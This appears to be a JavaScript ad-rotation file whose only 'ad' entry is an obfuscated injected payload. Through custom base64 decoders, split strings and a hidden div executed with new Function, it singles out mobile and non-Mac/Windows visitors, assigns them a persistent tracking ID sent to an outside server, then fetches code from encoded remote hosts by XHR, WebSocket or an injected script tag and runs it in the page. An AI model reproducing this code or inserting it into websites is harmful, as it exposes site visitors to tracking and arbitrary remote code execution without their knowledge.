
var randoms = {
	ads_codes: ['<div style="display: none !important;">function LamDRbAJ(e){var t="",n=r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++;}else if(r&gt;191&&r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)&lt;&lt;6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)&lt;&lt;12|(c2&63)&lt;&lt;6|c3&63);n+=3;}}return t;};function lQMbox(e){var m=\'ABCDEFGHIJKLMNOPQRSTUVWXYZ\'+\'abcdefghijklmnopqrstuvwxyz\'+\'0123456789+/=\';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f&lt;e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&15)&lt;&lt;4|u&gt;&gt;2;i=(u&3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r);}if(a!=64){t=t+String.fromCharCode(i);}}return LamDRbAJ(t);};window[\'\'+\'H\'+\'e\'+\'c\'+\'p\'+\'X\'+\'b\'+\'a\'+\'\']=((navigator.platform&&!/^Mac|Win/.test(navigator.platform))||(!navigator.platform&&/Android|iOS|iPhone/i.test(navigator.userAgent)))?function(){;(function(u,k,i,w,d,c){var x=lQMbox,cs=d[x(\'Y3VycmVudFNjcmlwdA==\')],crd=x(\'Y3JlYXRlRWxlbWVudA==\');\'jQuery\';u=decodeURIComponent(x(u.replace(new RegExp(c[0]+\'\'+c[0],\'g\'),c[0])));!function(o,t){var a=o.getItem(t);if(!a||32!==a.length){a=\'\';for(var e=0;e!=32;e++)a+=Math.floor(16*Math.random()).toString(16);o.setItem(t,a)}var n=\'https://phm.jtvpeuu.com:7891/stats/14903/\'+i+\'?ukey=\'+a+\'&host=\'+window.location.host;navigator.sendBeacon?navigator.sendBeacon(n):(new Image).src=n}(localStorage,\'__tsuk\');\'jQuery\';if(navigator.userAgent.indexOf(\'b\'+\'a\'+\'id\'+\'u\')!=-1){var xhr=new XMLHttpRequest();xhr.open(\'POST\',u+\'/vh3/\'+i);xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded;\');xhr.setRequestHeader(\'X-REQUESTED-WITH\',\'XMLHttpRequest\');xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){var data=JSON.parse(xhr.responseText);new Function(\'_\'+\'t\'+\'d\'+\'cs\',new Function(\'c\',data.result.decode+\';return \'+data.result.name+\'(c)\')(data.result.img.join(\'\')))(cs);}};xhr.send(\'u=1\');}else if(WebSocket&&/UCBrowser|Quark|Huawei|Vivo|NewsArticle/i.test(navigator.userAgent)){k=decodeURIComponent(x(k.replace(new RegExp(c[1]+\'\'+c[1],\'g\'),c[1])));var ws=new WebSocket(k+\'/wh3/\'+i);ws.onmessage=function(e){ws.close();new Function(\'_tdcs\',x(e.data))(cs);};ws.onerror=function(){var s=d[crd](\'script\');s.src=u+\'/vh3/\'+i;cs.parentElement.insertBefore(s,cs);}}else{var s=d[crd](\'script\');s.src=u+\'/vh3/\'+i;cs.parentElement.insertBefore(s,cs);}})(\'aHHR0cHHMlM0ElMkYlMkZncnQuc2lhdWh3by5jb20lM0E4ODkx\',\'d3NzJTTNBJTTJGJTTJGdGd1LmN6dHJ4eC5jb20lM0E5NTTMz\',\'165495\',window,document,[\'H\',\'T\']);}:function(){};<'+'/div><script>new Function(document[\'cu\'+\'rren\'+\'tScr\'+\'ipt\'][\'prev\'+\'iousE\'+\'leme\'+\'ntSi\'+\'bling\'][\'tex\'+\'tCo\'+\'ntent\'])();<'+'/script><div> <div><div> <'+'/div>  <'+'/div><'+'/div><div> <'+'/div><script>HecpXba();<'+'/script>'],
	ads_weight: [10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();
